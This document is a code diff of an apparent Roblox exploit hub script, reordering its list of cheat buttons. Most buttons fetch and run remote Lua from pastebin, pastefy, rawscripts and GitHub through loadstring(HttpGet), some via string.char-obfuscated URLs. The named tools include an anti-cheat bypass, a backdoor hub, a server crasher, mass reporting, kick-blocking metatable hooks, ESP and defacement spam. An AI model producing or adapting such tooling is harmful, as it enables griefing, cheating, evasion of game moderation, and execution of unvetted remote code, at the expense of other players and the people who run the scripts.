@@ -404,86 +404,23 @@ local function createButton(parent, text, callback)
     btn.MouseButton1Click:Connect(callback)
 end
 
+-- All buttons now in Main tab, alphabetically sorted (A-Z, case-insensitive)
 local buttons = {
-    {"Set Skybox", function()
-        local id = "rbxassetid://82411403129832"
-        local s = Instance.new("Sky", game.Lighting)
-        s.SkyboxBk = id
-        s.SkyboxDn = id
-        s.SkyboxFt = id
-        s.SkyboxLf = id
-        s.SkyboxRt = id
-        s.SkyboxUp = id
-    end},
-    {"Play Song", function()
-        local snd = Instance.new("Sound", workspace)
-        snd.SoundId = "rbxassetid://114573847650036"
-        snd.Looped = true
-        snd.Volume = 10
-        snd.PlaybackSpeed = 0.17
-        snd:Play()
-    end},
-    {"Decal Spam", function()
-        local decalId = "130720573923509"
-        local function applyDecal(part)
-            if part:IsA("BasePart") then
-                local surfaces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back}
-                for _, surface in pairs(surfaces) do
-                    local decal = Instance.new("Decal")
-                    decal.Texture = "rbxassetid://" .. decalId
-                    decal.Face = surface
-                    decal.Parent = part
-                end
-            end
-        end
-        for _, obj in pairs(workspace:GetDescendants()) do
-            applyDecal(obj)
-        end
-        workspace.DescendantAdded:Connect(applyDecal)
-        print("All parts now have the decal everywhere! 🗿")
-    end},
-    {"Set Particles", function()
-        for _, v in pairs(workspace:GetDescendants()) do
-            if v:IsA("BasePart") then
-                local p = Instance.new("ParticleEmitter", v)
-                p.Texture = "rbxassetid://82411403129832"
-            end
-        end
-    end},
-    {"ServerHint Message", function()
-        local h = Instance.new("Hint", workspace)
-        h.Text = "BOW DOWN TO NAS9229ALT & HAXSTER998 CUZ WE PWNED THIS GAME LOL"
-    end},
-    {"Nameless Admin", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))() end},
-    {"Disco Fog", function()
-        local Lighting = game:GetService("Lighting")
-        if Lighting:FindFirstChild("DiscoFogConnection") then Lighting.DiscoFogConnection:Disconnect() end
-        local discoConnection = RunService.RenderStepped:Connect(function()
-            Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
-        end)
-        Lighting:SetAttribute("DiscoFogConnection", discoConnection)
-    end},
-    {"Btools", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Btools-41524"))() end},
-    {"Inf Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
-    {"Jork", function() loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))() end},
-    {"Sirius", function() loadstring(game:HttpGet('https://sirius.menu/sirius'))() end},
-    {"Skrubl0rdz Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lkidd-skybox-script-10964"))() end},
     {"007n7 Decal Spam", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-007n7-decal-spam-Not-FE-26963"))() end},
-    {"Dex Explorer", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))() end},
-    {"SimpleSpy", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-SimpleSpy-20145"))() end},
-    {"FE Invisible", function() loadstring(game:HttpGet("https://pastefy.app/mjkbQzXk/raw"))() end},
+    {"[Ancient] NasGUI V1.0", function() loadstring(game:HttpGet("https://pastefy.app/P7a8Lj5Y/raw"))() end},
+    {"Adonis Bypass", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))() end},
+    {"Animation Grabber", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anim-Grabber-21176"))() end},
+    {"Anti-AFK", function()
+        local VirtualUser = game:GetService("VirtualUser")
+        game:GetService("Players").LocalPlayer.Idled:Connect(function()
+            VirtualUser:CaptureController()
+            VirtualUser:ClickButton2(Vector2.new())
+        end)
+    end},
     {"Anti-Bang", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anti-Bang-Script-39958"))() end},
-    {"Freaky Ahh Messages", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Freaky-ahh-quotes-by-me-43270"))() end},
-    {"Fake R6 FE", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/R6.txt"))() end},
-    {"c00lgui by team c00lkidd", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/36410b4f949d3a10e8b39fc7cdcc8cfb67aefe25/c00l%20gui"))() end},
-    {"Skeleton Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Skeleton-skybox-53658"))() end},
     {"Anti-Chat Logger", function() loadstring(game:HttpGet("https://pastebin.com/raw/qjDfA6E5"))() end},
-    {"Dance GUI by Nas", function() loadstring(game:HttpGet("https://pastefy.app/lmRy7mqO/raw"))() end},
-    {"FE Goofy Animations", function() loadstring(game:HttpGet("https://pastebin.com/raw/UQhaBfEZ"))() end},
-    {"Lag All Players", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-TOOL-SERVER-CRASHER-30316"))() end},
-    {"R6 Animations GUI", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/aqua-hub-is-a-skid-lol/refs/heads/main/animatrix"))() end},
-    {"OP Sword Tool", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))() end},
-    {"FE KJ R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Temu-KJ-IMPROVED-19618"))() end},
+    {"Anti-Ragdoll & Fling", function() loadstring(game:HttpGet("https://pastefy.app/UiCdR9IH/raw"))() end},
+    {"Audio Logger", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Audio-Logger-1522"))() end},
     {"Auto Heal", function()
         spawn(function()
             while task.wait(1) do
@@ -494,8 +431,7 @@ local buttons = {
             end
         end)
     end},
-    {"Animation Grabber", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Anim-Grabber-21176"))() end},
-    {"LALOL Hub Backdoor", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-Hub-Backdoor-58564"))() end},
+    {"Backflip", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backflip-Script-18595"))() end},
     {"Billboard GUI", function()
         local billboard = Instance.new("BillboardGui")
         billboard.Adornee = game.Players.LocalPlayer.Character:FindFirstChild("Head")
@@ -512,9 +448,6 @@ local buttons = {
         label.Font = Enum.Font.SourceSansBold
         label.Parent = billboard
     end},
-    {"c00lclan v2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lclan-v2-52915"))() end},
-    {"FE Collection", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sypcerr/FECollection/refs/heads/main/script.lua", true))() end},
-    {"FE John Doe", function() loadstring(game:HttpGet('https://pastebin.com/raw/sB9Wwx9v', true))() end},
     {"Billboard Others", function()
         for _, player in pairs(Players:GetPlayers()) do
             if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("Head") then
@@ -537,33 +470,20 @@ local buttons = {
             end
         end
     end},
-    {"Nas' Trail", function()
-        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local hrp = char:WaitForChild("HumanoidRootPart")
-        if hrp:FindFirstChild("NasTrailAttachment0") then
-            for _, obj in pairs(hrp:GetChildren()) do
-                if obj:IsA("Trail") or obj:IsA("Attachment") then obj:Destroy() end
-            end
+    {"Brookhaven c00lkidd Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-skybox-c00lkidd-59724"))() end},
+    {"Btools", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Btools-41524"))() end},
+    {"c00lclan v2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-c00lclan-v2-52915"))() end},
+    {"c00lgui by team c00lkidd", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/C00lHamoot/c00lgui-1/36410b4f949d3a10e8b39fc7cdcc8cfb67aefe25/c00l%20gui"))() end},
+    {"c00lgui Reborn v0.5", function() loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)() end},
+    {"Client-Side AK-47", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIC-FE-AK47-5040"))() end},
+    {"Clone Yourself", function()
+        local plr = LocalPlayer
+        if plr and plr.Character then
+            local clone = plr.Character:Clone()
+            clone.Parent = workspace
+            clone:SetPrimaryPartCFrame(plr.Character:GetPrimaryPartCFrame() + Vector3.new(3,0,0))
         end
-        local att0 = Instance.new("Attachment")
-        att0.Name = "NasTrailAttachment0"
-        att0.Position = Vector3.new(0, 1, 0)
-        att0.Parent = hrp
-        local att1 = Instance.new("Attachment")
-        att1.Name = "NasTrailAttachment1"
-        att1.Position = Vector3.new(0, -1, 0)
-        att1.Parent = hrp
-        local trail = Instance.new("Trail")
-        trail.Attachment0 = att0
-        trail.Attachment1 = att1
-        trail.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 0))}
-        trail.Lifetime = 1
-        trail.MinLength = 0.1
-        trail.LightEmission = 1
-        trail.WidthScale = NumberSequence.new(0.5)
-        trail.Parent = hrp
     end},
-    {"FE R15 Sonic 2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-R15-Sonic-The-Hedgehog-63923"))() end},
     {"Create Team", function()
         local Teams = game:GetService("Teams")
         local teamName = "TEAM NAS9229ALT JOIN TODAY!"
@@ -590,42 +510,35 @@ local buttons = {
         teamStat.Value = team.Name
         LocalPlayer.Team = team
     end},
-    {"Universal Anti-Kick (FE)", function()
-        local mt = getrawmetatable(game)
-        local oldNamecall = mt.__namecall
-        setreadonly(mt, false)
-        mt.__namecall = newcclosure(function(self, ...)
-            local args = {...}
-            local method = getnamecallmethod()
-            if method == "Kick" and self == game.Players.LocalPlayer then
-                warn("Blocked a kick attempt!")
-                return
-            end
-            return oldNamecall(self, ...)
-        end)
-        setreadonly(mt, true)
-        if LocalPlayer.Character then
-            LocalPlayer.Character:GetPropertyChangedSignal("Parent"):Connect(function()
-                if not LocalPlayer.Character.Parent then
-                    warn("Attempted to remove character! Re-parenting...")
-                    LocalPlayer.Character.Parent = workspace
+    {"Dance GUI by Nas", function() loadstring(game:HttpGet("https://pastefy.app/lmRy7mqO/raw"))() end},
+    {"Decal Spam", function()
+        local decalId = "130720573923509"
+        local function applyDecal(part)
+            if part:IsA("BasePart") then
+                local surfaces = {Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right, Enum.NormalId.Front, Enum.NormalId.Back}
+                for _, surface in pairs(surfaces) do
+                    local decal = Instance.new("Decal")
+                    decal.Texture = "rbxassetid://" .. decalId
+                    decal.Face = surface
+                    decal.Parent = part
                 end
-            end)
+            end
         end
+        for _, obj in pairs(workspace:GetDescendants()) do
+            applyDecal(obj)
+        end
+        workspace.DescendantAdded:Connect(applyDecal)
+        print("All parts now have the decal everywhere! 🗿")
     end},
-    {"Mass Report Others", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Mass-Report-Others-42251"))() end},
-    {"Grab Unanchored Parts", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-grab-unanchored-blocks-42313"))() end},
-    {"FE Boogie Down", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-boogie-down-53232"))() end},
-    {"FE Chat Bypass", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-chisis-byp*s-54088"))() end},
-    {"Remote-Abuse Admin", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-remote-abuse-FE-admin-script-27923"))() end},
-    {"Prizz Admin", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Prizz-Admin-14511"))() end},
-    {"VC Unbanner", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Voice-Chat-Unban-42843"))() end},
-    {"JanGUI v2", function() loadstring(game:HttpGet("https://pastefy.app/Sfeg0MGf/raw"))() end},
-    {"SaveInstance V2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universally-saveinstance-V2-42081"))() end},
-    {"Roblox Emotes & Animations", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-7yd7-I-Emote-Script-48024"))() end},
-    {"Modified Ring Parts", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-modified-ring-parts-55157"))() end},
-    {"FE NPC Control", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Control-script-Credits-to-patrick-34156"))() end},
-    {"FE Sword Tool", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Classic-Sword-Fling-Tool-16842"))() end},
+    {"Dex Explorer", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))() end},
+    {"Disco Fog", function()
+        local Lighting = game:GetService("Lighting")
+        if Lighting:FindFirstChild("DiscoFogConnection") then Lighting.DiscoFogConnection:Disconnect() end
+        local discoConnection = RunService.RenderStepped:Connect(function()
+            Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
+        end)
+        Lighting:SetAttribute("DiscoFogConnection", discoConnection)
+    end},
     {"Drop-Kick Tool FE", function()
         local Players = game:GetService("Players")
         local RunService = game:GetService("RunService")
@@ -690,29 +603,7 @@ local buttons = {
             task.delay(cooldown, function() canUse = true end)
         end)
     end},
-    {"RemoteSpy V3", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-RemoteSpy-v3-33731"))() end},
-    {"Mobile Shiftlock", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-For-Mobile-Script-36530"))() end},
-    {"Adonis Bypass", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-adonis-admin-bypass-19375"))() end},
-    {"FE Omniman R15", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Omniman-49493"))() end},
-    {"Retro Animations R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Classic-Animations-2971"))() end},
-    {"MorfOS", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/formidy/morfOS/refs/heads/main/main.lua"))() end},
-    {"Private Chat", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-a-secretive-Fe-chat-for-communication-without-filtering-49526"))() end},
-    {"FE Hug R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-hug-script-v1-33471"))() end},
-    {"FilteringEnabled Status", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-checker-41897"))() end},
-    {"Client-Side AK-47", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-EPIC-FE-AK47-5040"))() end},
-    {"Backflip", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Backflip-Script-18595"))() end},
-    {"Spin Skybox", function()
-        local lighting = game:GetService("Lighting")
-        local sky = lighting:FindFirstChildOfClass("Sky")
-        if not sky then warn("Sky object not found under Lighting") return end
-        local speed = 360 * 1000000
-        RunService.RenderStepped:Connect(function(dt)
-            local current = sky.SkyboxOrientation
-            local newX = (current.X + speed * dt) % 360
-            sky.SkyboxOrientation = Vector3.new(newX, current.Y, current.Z)
-        end)
-    end},
-    {"Nas9229alt Punch Tool", function() loadstring(game:HttpGet("https://pastefy.app/nZEjE2JU/raw?part=Punch%20Fling%20by%20Nas9229alt.lua"))() end},
+    {"Energize GUI Animations", function() loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-energize-gui-24798"))() end},
     {"ESP", function()
         local Players = game:GetService("Players")
         local Workspace = game:GetService("Workspace")
@@ -750,71 +641,21 @@ local buttons = {
         Workspace.DescendantAdded:Connect(updateNPCESP)
         print("[ESP] Active: Players=Red, NPCs=Blue")
     end},
-    {"Friends ESP", function()
-        local Players = game:GetService("Players")
-        local LocalPlayer = Players.LocalPlayer
-        local function createHighlight(character, color)
-            local existing = character:FindFirstChild("NasFriendsESP")
-            if existing then existing:Destroy() end
-            local highlight = Instance.new("Highlight")
-            highlight.Name = "NasFriendsESP"
-            highlight.FillColor = color
-            highlight.OutlineColor = color
-            highlight.FillTransparency = 0.5
-            highlight.OutlineTransparency = 0
-            highlight.Adornee = character
-            highlight.Parent = character
-        end
-        local function applyToPlayer(player)
-            if player == LocalPlayer then return end
-            if not LocalPlayer:IsFriendsWith(player.UserId) then return end
-            if player.Character then
-                createHighlight(player.Character, Color3.fromRGB(255,255,0))
-            end
-            player.CharacterAdded:Connect(function(char)
-                createHighlight(char, Color3.fromRGB(255,255,0))
-            end)
-        end
-        for _, player in pairs(Players:GetPlayers()) do applyToPlayer(player) end
-        Players.PlayerAdded:Connect(applyToPlayer)
-        print("[Friends ESP] Active: highlighting all friends in yellow")
-    end},
-    {"FORCE TOUCH GUI", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FORCE-TOUCH-GUI-UNIVERSAL-OP-CAN-KILL-OR-KICK-43469"))() end},
-    {"FE R15 Sonic", function() loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))() end},
+    {"Fake R6 FE", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ALLAHSIZV0C0N456793/Hj/refs/heads/main/R6.txt"))() end},
+    {"FE Boogie Down", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-boogie-down-53232"))() end},
+    {"FE Chat Bypass", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-chisis-byp*s-54088"))() end},
+    {"FE Collection", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sypcerr/FECollection/refs/heads/main/script.lua", true))() end},
+    {"FE Forsaken", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forsakination-48596"))() end},
+    {"FE Goofy Animations", function() loadstring(game:HttpGet("https://pastebin.com/raw/UQhaBfEZ"))() end},
+    {"FE Hug R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-hug-script-v1-33471"))() end},
+    {"FE Invisible", function() loadstring(game:HttpGet("https://pastefy.app/mjkbQzXk/raw"))() end},
+    {"FE John Doe", function() loadstring(game:HttpGet('https://pastebin.com/raw/sB9Wwx9v', true))() end},
+    {"FE KJ R6", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Universal-Temu-KJ-IMPROVED-19618"))() end},
+    {"FE NPC Control", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Control-script-Credits-to-patrick-34156"))() end},
+    {"FE Omniman R15", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fe-Omniman-49493"))() end},
     {"FE R15 Invincible Flight", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invinicible-Flight-R15-45414"))() end},
-    {"JanGUI V1.0 Normal", function()
-        local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,57,55,68,50,74,118,85)
-        loadstring(game:HttpGet(u, true))()
-    end},
-    {"Fire TouchInterests", function()
-        local Workspace = game:GetService("Workspace")
-        local RunService = game:GetService("RunService")
-        local toggled = false
-        local connection
-        local function fireTouches()
-            for _, part in pairs(Workspace:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    for _, touch in pairs(part:GetTouchingParts()) do
-                        for _, v in pairs(part:GetChildren()) do
-                            if v:IsA("TouchTransmitter") then
-                                firetouchinterest(touch, part, 0)
-                                firetouchinterest(touch, part, 1)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-        if not toggled then
-            toggled = true
-            connection = RunService.RenderStepped:Connect(fireTouches)
-            print("[TouchInterests] Firing enabled")
-        else
-            toggled = false
-            if connection then connection:Disconnect() end
-            print("[TouchInterests] Firing disabled")
-        end
-    end},
+    {"FE R15 Sonic", function() loadstring(game:HttpGet("https://pastefy.app/XCtZsGhP/raw"))() end},
+    {"FE R15 Sonic 2", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-R15-Sonic-The-Hedgehog-63923"))() end},
     {"FE Spoofer", function()
         local Workspace = game:GetService("Workspace")
         local applied = false
@@ -869,29 +710,235 @@ local buttons = {
         end
         if not applied then applySpoof() else removeSpoof() end
     end},
-    {"JanDestroy GUI", function() loadstring(game:HttpGet("https://pastebin.com/raw/uJ0P9mfE"))() end},
-    {"c00lgui Reborn v0.5", function() loadstring(game:GetObjects("rbxassetid://8127297852")[1].Source)() end},
-    {"Anti-Ragdoll & Fling", function() loadstring(game:HttpGet("https://pastefy.app/UiCdR9IH/raw"))() end},
-    {"Infinite Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
-    {"JanGUI v1", function() loadstring(game:HttpGet("https://pastefy.app/pviNRilX/raw"))() end},
-    {"FE Forsaken", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forsakination-48596"))() end},
-    {"T0PK3K 5.0", function() loadstring(game:HttpGet("https://gist.githubusercontent.com/nosyliam/3a0464974205a93d31b9f188ace47a53/raw/983b37288a04ce048b9a8cde36fefa0b7564691a/tksrc.lua"))() end},
-    {"J44sGUI by Jan & Nas", function() loadstring(game:HttpGet("https://pastefy.app/zhHfBbeA/raw"))() end},
-    {"Audio Logger", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Audio-Logger-1522"))() end},
+    {"FE Sword Tool", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Classic-Sword-Fling-Tool-16842"))() end},
     {"FE TikTok Emotes 2024", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Roblox-Tiktok-Emotes-Script-2024-R15-Only-49032"))() end},
-    {"Brookhaven c00lkidd Skybox", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Brookhaven-RP-skybox-c00lkidd-59724"))() end},
-    {"Secret Service Panel", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Secret-Service-panel-9623"))() end},
-    {"Wait They Don't Love You Dance", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Wait-They-Dont-Love-You-Like-I-Love-You-Animation-Dance-24631"))() end},
+    {"FilteringEnabled Status", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-checker-41897"))() end},
+    {"Fire TouchInterests", function()
+        local Workspace = game:GetService("Workspace")
+        local RunService = game:GetService("RunService")
+        local toggled = false
+        local connection
+        local function fireTouches()
+            for _, part in pairs(Workspace:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    for _, touch in pairs(part:GetTouchingParts()) do
+                        for _, v in pairs(part:GetChildren()) do
+                            if v:IsA("TouchTransmitter") then
+                                firetouchinterest(touch, part, 0)
+                                firetouchinterest(touch, part, 1)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+        if not toggled then
+            toggled = true
+            connection = RunService.RenderStepped:Connect(fireTouches)
+            print("[TouchInterests] Firing enabled")
+        else
+            toggled = false
+            if connection then connection:Disconnect() end
+            print("[TouchInterests] Firing disabled")
+        end
+    end},
+    {"Fly GUI v3", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Fly-Gui-V3-Turkish-48460"))() end},
+    {"FORCE TOUCH GUI", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FORCE-TOUCH-GUI-UNIVERSAL-OP-CAN-KILL-OR-KICK-43469"))() end},
+    {"Freaky Ahh Messages", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Freaky-ahh-quotes-by-me-43270"))() end},
+    {"Friends ESP", function()
+        local Players = game:GetService("Players")
+        local LocalPlayer = Players.LocalPlayer
+        local function createHighlight(character, color)
+            local existing = character:FindFirstChild("NasFriendsESP")
+            if existing then existing:Destroy() end
+            local highlight = Instance.new("Highlight")
+            highlight.Name = "NasFriendsESP"
+            highlight.FillColor = color
+            highlight.OutlineColor = color
+            highlight.FillTransparency = 0.5
+            highlight.OutlineTransparency = 0
+            highlight.Adornee = character
+            highlight.Parent = character
+        end
+        local function applyToPlayer(player)
+            if player == LocalPlayer then return end
+            if not LocalPlayer:IsFriendsWith(player.UserId) then return end
+            if player.Character then
+                createHighlight(player.Character, Color3.fromRGB(255,255,0))
+            end
+            player.CharacterAdded:Connect(function(char)
+                createHighlight(char, Color3.fromRGB(255,255,0))
+            end)
+        end
+        for _, player in pairs(Players:GetPlayers()) do applyToPlayer(player) end
+        Players.PlayerAdded:Connect(applyToPlayer)
+        print("[Friends ESP] Active: highlighting all friends in yellow")
+    end},
+    {"Grab Knife V4", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-Knife-V4-56561"))() end},
+    {"Grab Unanchored Parts", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-grab-unanchored-blocks-42313"))() end},
+    {"Inf Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
+    {"Infinite Yield", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end},
+    {"JanDestroy GUI", function() loadstring(game:HttpGet("https://pastebin.com/raw/uJ0P9mfE"))() end},
+    {"JanGUI v1", function() loadstring(game:HttpGet("https://pastefy.app/pviNRilX/raw"))() end},
+    {"JanGUI v2", function() loadstring(game:HttpGet("https://pastefy.app/Sfeg0MGf/raw"))() end},
     {"JanGUI v3", function() loadstring(game:HttpGet("https://pastefy.app/nvwROqdu/raw", true))() end},
+    {"JanGUI V1.0 Normal", function()
+        local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46,99,111,109,47,114,97,119,47,102,57,55,68,50,74,118,85)
+        loadstring(game:HttpGet(u, true))()
+    end},
+    {"Jork", function() loadstring(game:HttpGet("https://pastefy.app/lawnvcTT/raw", true))() end},
+    {"J44sGUI by Jan & Nas", function() loadstring(game:HttpGet("https://pastefy.app/zhHfBbeA/raw"))() end},
+    {"Lag All Players", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-TOOL-SERVER-CRASHER-30316"))() end},
+    {"LALOL Hub Backdoor", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-LALOL-Hub-Backdoor-58564"))() end},
+    {"Mass Report Others", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Mass-Report-Others-42251"))() end},
+    {"Mobile Shiftlock", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Shiftlock-For-Mobile-Script-36530"))() end},
+    {"Modified Ring Parts", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Super-modified-ring-parts-55157"))() end},
+    {"MorfOS", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/formidy/morfOS/refs/heads/main/main.lua"))() end},
+    {"Nameless Admin", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ltseverydayyou/Nameless-Admin/main/Source.lua"))() end},
+    {"Nas' Trail", function()
+        local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local hrp = char:WaitForChild("HumanoidRootPart")
+        if hrp:FindFirstChild("NasTrailAttachment0") then
+            for _, obj in pairs(hrp:GetChildren()) do
+                if obj:IsA("Trail") or obj:IsA("Attachment") then obj:Destroy() end
+            end
+        end
+        local att0 = Instance.new("Attachment")
+        att0.Name = "NasTrailAttachment0"
+        att0.Position = Vector3.new(0, 1, 0)
+        att0.Parent = hrp
+        local att1 = Instance.new("Attachment")
+        att1.Name = "NasTrailAttachment1"
+        att1.Position = Vector3.new(0, -1, 0)
+        att1.Parent = hrp
+        local trail = Instance.new("Trail")
+        trail.Attachment0 = att0
+        trail.Attachment1 = att1
+        trail.Color = ColorSequence.new{ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 0))}
+        trail.Lifetime = 1
+        trail.MinLength = 0.1
+        trail.LightEmission = 1
+        trail.WidthScale = NumberSequence.new(0.5)
+        trail.Parent = hrp
+    end},
+    {"Nas9229alt Punch Tool", function() loadstring(game:HttpGet("https://pastefy.app/nZEjE2JU/raw?part=Punch%20Fling%20by%20Nas9229alt.lua"))() end},
+    {"NasGUI Reborn V1.7.6", function()
+        loadstring(game:HttpGet("https://pastefy.app/PSwknTJR/raw?part=NasGUI-v1.7.6_REBORN.lua"))()
+    end},
+    {"NasGUI V1.6 Reborn", function()
+        local u = string.char(104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,111,79,71,76,73,85,90,69,47,114,97,119)
+        loadstring(game:HttpGet(u))()
+    end},
     {"NasGUI v1.8 Reborn (LAST INDIE RELEASE)", function() loadstring(game:HttpGet("https://pastefy.app/cFUPaYlc/raw"))() end},
-    {"Energize GUI Animations", function() loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-energize-gui-24798"))() end}
+    {"OP Sword Tool", function() loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Linked-Sword-R6-Script-40329"))() end},
+    {"Play Song", function()
+        local snd = Instance.new("Sound", workspace)
+        snd.SoundId = "rbxassetid://114573847650036"
+        snd.Looped = true
+        snd.Volume = 10
+        snd.PlaybackSpeed = 0.17
+        snd:Play()
+    end},
